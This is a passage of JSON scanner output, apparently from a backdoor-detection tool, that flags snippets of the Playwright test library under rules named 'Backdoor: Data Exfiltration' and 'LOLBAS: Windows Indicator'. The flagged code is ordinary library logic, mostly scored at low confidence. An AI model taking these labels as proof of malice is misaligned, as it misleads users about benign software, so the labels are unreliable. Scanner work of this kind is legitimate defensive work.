                    "text": "} = (() => {\n  let isTTY = !!process.stdout.isTTY;\n  let ttyWidth = process.stdout.columns || 0;\n  if (process.env.PLAYWRIGHT_FORCE_TTY === 'false' || process.env.PLAYWRIGHT_FORCE_TTY === '0') {\n    isTTY = false;\n    ttyWidth = 0;\n  } else if (process.env.PLAYWRIGHT_FORCE_TTY === 'true' || process.env.PLAYWRIGHT_FORCE_TTY === '1') {\n",
                    "rendered": {
                      "text": "} = (() => {\n  let isTTY = !!process.stdout.isTTY;\n  let ttyWidth = process.stdout.columns || 0;\n  if (process.env.PLAYWRIGHT_FORCE_TTY === 'false' || process.env.PLAYWRIGHT_FORCE_TTY === '0') {\n    isTTY = false;\n    ttyWidth = 0;\n  } else if (process.env.PLAYWRIGHT_FORCE_TTY === 'true' || process.env.PLAYWRIGHT_FORCE_TTY === '1') {\n",
                      "markdown": "`} = (() => {\n  let isTTY = !!process.stdout.isTTY;\n  let ttyWidth = process.stdout.columns || 0;\n  if (process.env.PLAYWRIGHT_FORCE_TTY === 'false' || process.env.PLAYWRIGHT_FORCE_TTY === '0') {\n    isTTY = false;\n    ttyWidth = 0;\n  } else if (process.env.PLAYWRIGHT_FORCE_TTY === 'true' || process.env.PLAYWRIGHT_FORCE_TTY === '1') {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/internalReporter.js"
                },
                "region": {
                  "startLine": 114,
                  "startColumn": 39,
                  "endLine": 114,
                  "endColumn": 43,
                  "snippet": {
                    "text": "    });\n    // Convert /var/folders to /private/var/folders on Mac.\n    if (!file || _fs.default.realpathSync(file) !== location.file) {\n      tokens.push(_base.colors.gray(`   at `) + `${(0, _base.relativeFilePath)(config, location.file)}:${location.line}`);\n      tokens.push('');\n    }\n    tokens.push(codeFrame);\n",
                    "rendered": {
                      "text": "    });\n    // Convert /var/folders to /private/var/folders on Mac.\n    if (!file || _fs.default.realpathSync(file) !== location.file) {\n      tokens.push(_base.colors.gray(`   at `) + `${(0, _base.relativeFilePath)(config, location.file)}:${location.line}`);\n      tokens.push('');\n    }\n    tokens.push(codeFrame);\n",
                      "markdown": "`    });\n    // Convert /var/folders to /private/var/folders on Mac.\n    if (!file || _fs.default.realpathSync(file) !== location.file) {\n      tokens.push(_base.colors.gray(`   at `) + `${(0, _base.relativeFilePath)(config, location.file)}:${location.line}`);\n      tokens.push('');\n    }\n    tokens.push(codeFrame);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/loadUtils.js"
                },
                "region": {
                  "startLine": 298,
                  "startColumn": 35,
                  "endLine": 298,
                  "endColumn": 40,
                  "snippet": {
                    "text": "function sourceMapSources(file, cache) {\n  let sources = [file];\n  if (!file.endsWith('.js')) return sources;\n  if (cache.has(file)) return cache.get(file);\n  try {\n    const sourceMap = _utilsBundle.sourceMapSupport.retrieveSourceMap(file);\n    const sourceMapData = typeof (sourceMap === null || sourceMap === void 0 ? void 0 : sourceMap.map) === 'string' ? JSON.parse(sourceMap.map) : sourceMap === null || sourceMap === void 0 ? void 0 : sourceMap.map;\n",
                    "rendered": {
                      "text": "function sourceMapSources(file, cache) {\n  let sources = [file];\n  if (!file.endsWith('.js')) return sources;\n  if (cache.has(file)) return cache.get(file);\n  try {\n    const sourceMap = _utilsBundle.sourceMapSupport.retrieveSourceMap(file);\n    const sourceMapData = typeof (sourceMap === null || sourceMap === void 0 ? void 0 : sourceMap.map) === 'string' ? JSON.parse(sourceMap.map) : sourceMap === null || sourceMap === void 0 ? void 0 : sourceMap.map;\n",
                      "markdown": "`function sourceMapSources(file, cache) {\n  let sources = [file];\n  if (!file.endsWith('.js')) return sources;\n  if (cache.has(file)) return cache.get(file);\n  try {\n    const sourceMap = _utilsBundle.sourceMapSupport.retrieveSourceMap(file);\n    const sourceMapData = typeof (sourceMap === null || sourceMap === void 0 ? void 0 : sourceMap.map) === 'string' ? JSON.parse(sourceMap.map) : sourceMap === null || sourceMap === void 0 ? void 0 : sourceMap.map;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/loadUtils.js"
                },
                "region": {
                  "startLine": 267,
                  "startColumn": 41,
                  "endLine": 267,
                  "endColumn": 46,
                  "snippet": {
                    "text": "  const testsByFullTitle = new Map();\n  for (const test of fileSuite.allTests()) {\n    const fullTitle = test.titlePath().slice(1).join(' › ');\n    const existingTest = testsByFullTitle.get(fullTitle);\n    if (existingTest) {\n      const error = {\n        message: `Error: duplicate test title \"${fullTitle}\", first declared in ${buildItemLocation(config.config.rootDir, existingTest)}`,\n",
                    "rendered": {
                      "text": "  const testsByFullTitle = new Map();\n  for (const test of fileSuite.allTests()) {\n    const fullTitle = test.titlePath().slice(1).join(' › ');\n    const existingTest = testsByFullTitle.get(fullTitle);\n    if (existingTest) {\n      const error = {\n        message: `Error: duplicate test title \"${fullTitle}\", first declared in ${buildItemLocation(config.config.rootDir, existingTest)}`,\n",
                      "markdown": "`  const testsByFullTitle = new Map();\n  for (const test of fileSuite.allTests()) {\n    const fullTitle = test.titlePath().slice(1).join(' › ');\n    const existingTest = testsByFullTitle.get(fullTitle);\n    if (existingTest) {\n      const error = {\n        message: `Error: duplicate test title \"${fullTitle}\", first declared in ${buildItemLocation(config.config.rootDir, existingTest)}`,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/loadUtils.js"
                },
                "region": {
                  "startLine": 203,
                  "startColumn": 120,
                  "endLine": 203,
                  "endColumn": 125,
                  "snippet": {
                    "text": "\n    // Clone file suites for dependency projects.\n    for (const project of projectClosure.keys()) {\n      if (projectClosure.get(project) === 'dependency') rootSuite._prependSuite(buildProjectSuite(project, projectSuites.get(project)));\n    }\n  }\n  return rootSuite;\n",
                    "rendered": {
                      "text": "\n    // Clone file suites for dependency projects.\n    for (const project of projectClosure.keys()) {\n      if (projectClosure.get(project) === 'dependency') rootSuite._prependSuite(buildProjectSuite(project, projectSuites.get(project)));\n    }\n  }\n  return rootSuite;\n",
                      "markdown": "`\n    // Clone file suites for dependency projects.\n    for (const project of projectClosure.keys()) {\n      if (projectClosure.get(project) === 'dependency') rootSuite._prependSuite(buildProjectSuite(project, projectSuites.get(project)));\n    }\n  }\n  return rootSuite;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/loadUtils.js"
                },
                "region": {
                  "startLine": 203,
                  "startColumn": 24,
                  "endLine": 203,
                  "endColumn": 29,
                  "snippet": {
                    "text": "\n    // Clone file suites for dependency projects.\n    for (const project of projectClosure.keys()) {\n      if (projectClosure.get(project) === 'dependency') rootSuite._prependSuite(buildProjectSuite(project, projectSuites.get(project)));\n    }\n  }\n  return rootSuite;\n",
                    "rendered": {
                      "text": "\n    // Clone file suites for dependency projects.\n    for (const project of projectClosure.keys()) {\n      if (projectClosure.get(project) === 'dependency') rootSuite._prependSuite(buildProjectSuite(project, projectSuites.get(project)));\n    }\n  }\n  return rootSuite;\n",
                      "markdown": "`\n    // Clone file suites for dependency projects.\n    for (const project of projectClosure.keys()) {\n      if (projectClosure.get(project) === 'dependency') rootSuite._prependSuite(buildProjectSuite(project, projectSuites.get(project)));\n    }\n  }\n  return rootSuite;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/loadUtils.js"
                },
                "region": {
                  "startLine": 165,
                  "startColumn": 74,
                  "endLine": 165,
                  "endColumn": 79,
                  "snippet": {
                    "text": "    if (type === 'top-level') {\n      var _project$fullConfig$c;\n      project.project.repeatEach = (_project$fullConfig$c = project.fullConfig.configCLIOverrides.repeatEach) !== null && _project$fullConfig$c !== void 0 ? _project$fullConfig$c : project.project.repeatEach;\n      rootSuite._addSuite(buildProjectSuite(project, filteredProjectSuites.get(project)));\n    }\n  }\n\n",
                    "rendered": {
                      "text": "    if (type === 'top-level') {\n      var _project$fullConfig$c;\n      project.project.repeatEach = (_project$fullConfig$c = project.fullConfig.configCLIOverrides.repeatEach) !== null && _project$fullConfig$c !== void 0 ? _project$fullConfig$c : project.project.repeatEach;\n      rootSuite._addSuite(buildProjectSuite(project, filteredProjectSuites.get(project)));\n    }\n  }\n\n",
                      "markdown": "`    if (type === 'top-level') {\n      var _project$fullConfig$c;\n      project.project.repeatEach = (_project$fullConfig$c = project.fullConfig.configCLIOverrides.repeatEach) !== null && _project$fullConfig$c !== void 0 ? _project$fullConfig$c : project.project.repeatEach;\n      rootSuite._addSuite(buildProjectSuite(project, filteredProjectSuites.get(project)));\n    }\n  }\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/loadUtils.js"
                },
                "region": {
                  "startLine": 160,
                  "startColumn": 132,
                  "endLine": 160,
                  "endColumn": 137,
                  "snippet": {
                    "text": "  }\n\n  // Add post-filtered top-level projects to the root suite for sharding and 'only' processing.\n  const projectClosure = (0, _projectUtils.buildProjectsClosure)([...filteredProjectSuites.keys()], project => filteredProjectSuites.get(project)._hasTests());\n  for (const [project, type] of projectClosure) {\n    if (type === 'top-level') {\n      var _project$fullConfig$c;\n",
                    "rendered": {
                      "text": "  }\n\n  // Add post-filtered top-level projects to the root suite for sharding and 'only' processing.\n  const projectClosure = (0, _projectUtils.buildProjectsClosure)([...filteredProjectSuites.keys()], project => filteredProjectSuites.get(project)._hasTests());\n  for (const [project, type] of projectClosure) {\n    if (type === 'top-level') {\n      var _project$fullConfig$c;\n",
                      "markdown": "`  }\n\n  // Add post-filtered top-level projects to the root suite for sharding and 'only' processing.\n  const projectClosure = (0, _projectUtils.buildProjectsClosure)([...filteredProjectSuites.keys()], project => filteredProjectSuites.get(project)._hasTests());\n  for (const [project, type] of projectClosure) {\n    if (type === 'top-level') {\n      var _project$fullConfig$c;\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/loadUtils.js"
                },
                "region": {
                  "startLine": 118,
                  "startColumn": 52,
                  "endLine": 118,
                  "endColumn": 57,
                  "snippet": {
                    "text": "\n  // Collect file suites for each project.\n  for (const [project, files] of testRun.projectFiles) {\n    const suites = files.map(file => fileSuiteByFile.get(file)).filter(Boolean);\n    testRun.projectSuites.set(project, suites);\n  }\n}\n",
                    "rendered": {
                      "text": "\n  // Collect file suites for each project.\n  for (const [project, files] of testRun.projectFiles) {\n    const suites = files.map(file => fileSuiteByFile.get(file)).filter(Boolean);\n    testRun.projectSuites.set(project, suites);\n  }\n}\n",
                      "markdown": "`\n  // Collect file suites for each project.\n  for (const [project, files] of testRun.projectFiles) {\n    const suites = files.map(file => fileSuiteByFile.get(file)).filter(Boolean);\n    testRun.projectSuites.set(project, suites);\n  }\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/loadUtils.js"
                },
                "region": {
                  "startLine": 72,
                  "startColumn": 65,
                  "endLine": 72,
                  "endColumn": 70,
                  "snippet": {
                    "text": "  for (const [project, type] of projectClosure) {\n    if (type === 'dependency') {\n      const treatProjectAsEmpty = doNotRunTestsOutsideProjectFilter && !filteredProjects.includes(project);\n      const files = treatProjectAsEmpty ? [] : allFilesForProject.get(project) || (await (0, _projectUtils.collectFilesForProject)(project, fsCache));\n      filesToRunByProject.set(project, files);\n    }\n  }\n",
                    "rendered": {
                      "text": "  for (const [project, type] of projectClosure) {\n    if (type === 'dependency') {\n      const treatProjectAsEmpty = doNotRunTestsOutsideProjectFilter && !filteredProjects.includes(project);\n      const files = treatProjectAsEmpty ? [] : allFilesForProject.get(project) || (await (0, _projectUtils.collectFilesForProject)(project, fsCache));\n      filesToRunByProject.set(project, files);\n    }\n  }\n",
                      "markdown": "`  for (const [project, type] of projectClosure) {\n    if (type === 'dependency') {\n      const treatProjectAsEmpty = doNotRunTestsOutsideProjectFilter && !filteredProjects.includes(project);\n      const files = treatProjectAsEmpty ? [] : allFilesForProject.get(project) || (await (0, _projectUtils.collectFilesForProject)(project, fsCache));\n      filesToRunByProject.set(project, files);\n    }\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/compilationCache.js"
                },
                "region": {
                  "startLine": 226,
                  "startColumn": 40,
                  "endLine": 226,
                  "endColumn": 45,
                  "snippet": {
                    "text": "function dependenciesForTestFile(filename) {\n  const result = new Set();\n  for (const dep of fileDependencies.get(filename) || []) result.add(dep);\n  for (const dep of externalDependencies.get(filename) || []) result.add(dep);\n  return result;\n}\n\n",
                    "rendered": {
                      "text": "function dependenciesForTestFile(filename) {\n  const result = new Set();\n  for (const dep of fileDependencies.get(filename) || []) result.add(dep);\n  for (const dep of externalDependencies.get(filename) || []) result.add(dep);\n  return result;\n}\n\n",
                      "markdown": "`function dependenciesForTestFile(filename) {\n  const result = new Set();\n  for (const dep of fileDependencies.get(filename) || []) result.add(dep);\n  for (const dep of externalDependencies.get(filename) || []) result.add(dep);\n  return result;\n}\n\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/compilationCache.js"
                },
                "region": {
                  "startLine": 225,
                  "startColumn": 36,
                  "endLine": 225,
                  "endColumn": 41,
                  "snippet": {
                    "text": "}\nfunction dependenciesForTestFile(filename) {\n  const result = new Set();\n  for (const dep of fileDependencies.get(filename) || []) result.add(dep);\n  for (const dep of externalDependencies.get(filename) || []) result.add(dep);\n  return result;\n}\n",
                    "rendered": {
                      "text": "}\nfunction dependenciesForTestFile(filename) {\n  const result = new Set();\n  for (const dep of fileDependencies.get(filename) || []) result.add(dep);\n  for (const dep of externalDependencies.get(filename) || []) result.add(dep);\n  return result;\n}\n",
                      "markdown": "`}\nfunction dependenciesForTestFile(filename) {\n  const result = new Set();\n  for (const dep of fileDependencies.get(filename) || []) result.add(dep);\n  for (const dep of externalDependencies.get(filename) || []) result.add(dep);\n  return result;\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/compilationCache.js"
                },
                "region": {
                  "startLine": 221,
                  "startColumn": 25,
                  "endLine": 221,
                  "endColumn": 30,
                  "snippet": {
                    "text": "  return [...result];\n}\nfunction internalDependenciesForTestFile(filename) {\n  return fileDependencies.get(filename);\n}\nfunction dependenciesForTestFile(filename) {\n  const result = new Set();\n",
                    "rendered": {
                      "text": "  return [...result];\n}\nfunction internalDependenciesForTestFile(filename) {\n  return fileDependencies.get(filename);\n}\nfunction dependenciesForTestFile(filename) {\n  const result = new Set();\n",
                      "markdown": "`  return [...result];\n}\nfunction internalDependenciesForTestFile(filename) {\n  return fileDependencies.get(filename);\n}\nfunction dependenciesForTestFile(filename) {\n  const result = new Set();\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/compilationCache.js"
                },
                "region": {
                  "startLine": 172,
                  "startColumn": 41,
                  "endLine": 172,
                  "endColumn": 46,
                  "snippet": {
                    "text": "    fileDependencies.set(entry[0], new Set([...entry[1], ...existing]));\n  }\n  for (const entry of payload.externalDependencies) {\n    const existing = externalDependencies.get(entry[0]) || [];\n    externalDependencies.set(entry[0], new Set([...entry[1], ...existing]));\n  }\n}\n",
                    "rendered": {
                      "text": "    fileDependencies.set(entry[0], new Set([...entry[1], ...existing]));\n  }\n  for (const entry of payload.externalDependencies) {\n    const existing = externalDependencies.get(entry[0]) || [];\n    externalDependencies.set(entry[0], new Set([...entry[1], ...existing]));\n  }\n}\n",
                      "markdown": "`    fileDependencies.set(entry[0], new Set([...entry[1], ...existing]));\n  }\n  for (const entry of payload.externalDependencies) {\n    const existing = externalDependencies.get(entry[0]) || [];\n    externalDependencies.set(entry[0], new Set([...entry[1], ...existing]));\n  }\n}\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/compilationCache.js"
                },
                "region": {
                  "startLine": 168,
                  "startColumn": 37,
                  "endLine": 168,
                  "endColumn": 42,
                  "snippet": {
                    "text": "  for (const entry of payload.sourceMaps) sourceMaps.set(entry[0], entry[1]);\n  for (const entry of payload.memoryCache) memoryCache.set(entry[0], entry[1]);\n  for (const entry of payload.fileDependencies) {\n    const existing = fileDependencies.get(entry[0]) || [];\n    fileDependencies.set(entry[0], new Set([...entry[1], ...existing]));\n  }\n  for (const entry of payload.externalDependencies) {\n",
                    "rendered": {
                      "text": "  for (const entry of payload.sourceMaps) sourceMaps.set(entry[0], entry[1]);\n  for (const entry of payload.memoryCache) memoryCache.set(entry[0], entry[1]);\n  for (const entry of payload.fileDependencies) {\n    const existing = fileDependencies.get(entry[0]) || [];\n    fileDependencies.set(entry[0], new Set([...entry[1], ...existing]));\n  }\n  for (const entry of payload.externalDependencies) {\n",
                      "markdown": "`  for (const entry of payload.sourceMaps) sourceMaps.set(entry[0], entry[1]);\n  for (const entry of payload.memoryCache) memoryCache.set(entry[0], entry[1]);\n  for (const entry of payload.fileDependencies) {\n    const existing = fileDependencies.get(entry[0]) || [];\n    fileDependencies.set(entry[0], new Set([...entry[1], ...existing]));\n  }\n  for (const entry of payload.externalDependencies) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/compilationCache.js"
                },
                "region": {
                  "startLine": 106,
                  "startColumn": 27,
                  "endLine": 106,
                  "endColumn": 32,
                  "snippet": {
                    "text": "function getFromCompilationCache(filename, hash, moduleUrl) {\n  // First check the memory cache by filename, this cache will always work in the worker,\n  // because we just compiled this file in the loader.\n  const cache = memoryCache.get(filename);\n  if (cache !== null && cache !== void 0 && cache.codePath) {\n    try {\n      return {\n",
                    "rendered": {
                      "text": "function getFromCompilationCache(filename, hash, moduleUrl) {\n  // First check the memory cache by filename, this cache will always work in the worker,\n  // because we just compiled this file in the loader.\n  const cache = memoryCache.get(filename);\n  if (cache !== null && cache !== void 0 && cache.codePath) {\n    try {\n      return {\n",
                      "markdown": "`function getFromCompilationCache(filename, hash, moduleUrl) {\n  // First check the memory cache by filename, this cache will always work in the worker,\n  // because we just compiled this file in the loader.\n  const cache = memoryCache.get(filename);\n  if (cache !== null && cache !== void 0 && cache.codePath) {\n    try {\n      return {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/compilationCache.js"
                },
                "region": {
                  "startLine": 81,
                  "startColumn": 38,
                  "endLine": 81,
                  "endColumn": 43,
                  "snippet": {
                    "text": "    handleUncaughtExceptions: false,\n    retrieveSourceMap(source) {\n      if (!sourceMaps.has(source)) return null;\n      const sourceMapPath = sourceMaps.get(source);\n      try {\n        return {\n          map: JSON.parse(_fs.default.readFileSync(sourceMapPath, 'utf-8')),\n",
                    "rendered": {
                      "text": "    handleUncaughtExceptions: false,\n    retrieveSourceMap(source) {\n      if (!sourceMaps.has(source)) return null;\n      const sourceMapPath = sourceMaps.get(source);\n      try {\n        return {\n          map: JSON.parse(_fs.default.readFileSync(sourceMapPath, 'utf-8')),\n",
                      "markdown": "`    handleUncaughtExceptions: false,\n    retrieveSourceMap(source) {\n      if (!sourceMaps.has(source)) return null;\n      const sourceMapPath = sourceMaps.get(source);\n      try {\n        return {\n          map: JSON.parse(_fs.default.readFileSync(sourceMapPath, 'utf-8')),\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/compilationCache.js"
                },
                "region": {
                  "startLine": 57,
                  "startColumn": 36,
                  "endLine": 57,
                  "endColumn": 47,
                  "snippet": {
                    "text": "// - For workers-only dynamic imports or some cache problems, we will re-transpile files in\n//   each worker anew.\n\nconst cacheDir = exports.cacheDir = process.env.PWTEST_CACHE_DIR || ((_process$geteuid, _process) => {\n  if (process.platform === 'win32') return _path.default.join(_os.default.tmpdir(), `playwright-transform-cache`);\n  // Use `geteuid()` instead of more natural `os.userInfo().username`\n  // since `os.userInfo()` is not always available.\n",
                    "rendered": {
                      "text": "// - For workers-only dynamic imports or some cache problems, we will re-transpile files in\n//   each worker anew.\n\nconst cacheDir = exports.cacheDir = process.env.PWTEST_CACHE_DIR || ((_process$geteuid, _process) => {\n  if (process.platform === 'win32') return _path.default.join(_os.default.tmpdir(), `playwright-transform-cache`);\n  // Use `geteuid()` instead of more natural `os.userInfo().username`\n  // since `os.userInfo()` is not always available.\n",
                      "markdown": "`// - For workers-only dynamic imports or some cache problems, we will re-transpile files in\n//   each worker anew.\n\nconst cacheDir = exports.cacheDir = process.env.PWTEST_CACHE_DIR || ((_process$geteuid, _process) => {\n  if (process.platform === 'win32') return _path.default.join(_os.default.tmpdir(), `playwright-transform-cache`);\n  // Use `geteuid()` instead of more natural `os.userInfo().username`\n  // since `os.userInfo()` is not always available.\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/transform/compilationCache.js"
                },
                "region": {
                  "startLine": 57,
                  "startColumn": 44,
                  "endLine": 57,
                  "endColumn": 82,
                  "snippet": {
                    "text": "// - For workers-only dynamic imports or some cache problems, we will re-transpile files in\n//   each worker anew.\n\nconst cacheDir = exports.cacheDir = process.env.PWTEST_CACHE_DIR || ((_process$geteuid, _process) => {\n  if (process.platform === 'win32') return _path.default.join(_os.default.tmpdir(), `playwright-transform-cache`);\n  // Use `geteuid()` instead of more natural `os.userInfo().username`\n  // since `os.userInfo()` is not always available.\n",
                    "rendered": {
                      "text": "// - For workers-only dynamic imports or some cache problems, we will re-transpile files in\n//   each worker anew.\n\nconst cacheDir = exports.cacheDir = process.env.PWTEST_CACHE_DIR || ((_process$geteuid, _process) => {\n  if (process.platform === 'win32') return _path.default.join(_os.default.tmpdir(), `playwright-transform-cache`);\n  // Use `geteuid()` instead of more natural `os.userInfo().username`\n  // since `os.userInfo()` is not always available.\n",
                      "markdown": "`// - For workers-only dynamic imports or some cache problems, we will re-transpile files in\n//   each worker anew.\n\nconst cacheDir = exports.cacheDir = process.env.PWTEST_CACHE_DIR || ((_process$geteuid, _process) => {\n  if (process.platform === 'win32') return _path.default.join(_os.default.tmpdir(), `playwright-transform-cache`);\n  // Use `geteuid()` instead of more natural `os.userInfo().username`\n  // since `os.userInfo()` is not always available.\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/runner/reporters.js"
                },
                "region": {
                  "startLine": 79,
                  "startColumn": 113,
                  "endLine": 79,
                  "endColumn": 124,
                  "snippet": {
                    "text": "  if (reporters.length && !someReporterPrintsToStdio) {\n    // Add a line/dot/list-mode reporter for convenience.\n    // Important to put it first, just in case some other reporter stalls onEnd.\n    if (mode === 'list') reporters.unshift(new ListModeReporter());else if (mode !== 'merge') reporters.unshift(!process.env.CI ? new _line.default({\n      omitFailures: true\n    }) : new _dot.default());\n  }\n",
                    "rendered": {
                      "text": "  if (reporters.length && !someReporterPrintsToStdio) {\n    // Add a line/dot/list-mode reporter for convenience.\n    // Important to put it first, just in case some other reporter stalls onEnd.\n    if (mode === 'list') reporters.unshift(new ListModeReporter());else if (mode !== 'merge') reporters.unshift(!process.env.CI ? new _line.default({\n      omitFailures: true\n    }) : new _dot.default());\n  }\n",
